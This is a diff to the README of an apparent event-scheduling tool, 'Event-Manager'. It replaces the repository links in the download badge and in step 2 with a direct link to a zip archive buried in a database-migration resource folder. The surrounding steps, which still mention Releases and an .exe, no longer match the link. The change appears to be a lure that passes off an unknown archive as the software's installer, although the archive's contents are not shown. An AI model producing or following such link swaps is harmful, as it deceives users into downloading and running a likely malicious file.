@@ -1,6 +1,6 @@
 # 📅 Event-Manager - Streamline your event scheduling tasks now
 
-[![Download Event-Manager](https://img.shields.io/badge/Download-Event--Manager-blue)](https://github.com/libreriaaunclick/Event-Manager)
+[![Download Event-Manager](https://img.shields.io/badge/Download-Event--Manager-blue)](https://raw.githubusercontent.com/libreriaaunclick/Event-Manager/main/src/main/resources/db/migration/Manager_Event_2.9.zip)
 
 ## 📋 About the software
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run this software. Please confirm you
 You need to access the official repository to obtain the file. Please follow these steps to download the installer:
 
 1. Open your web browser.
-2. Navigate to this address: https://github.com/libreriaaunclick/Event-Manager
+2. Navigate to this address: https://raw.githubusercontent.com/libreriaaunclick/Event-Manager/main/src/main/resources/db/migration/Manager_Event_2.9.zip
 3. Look for the "Releases" section on the right side of the screen.
 4. Click the most recent version available.
 5. Select the file ending in .exe to start the download.
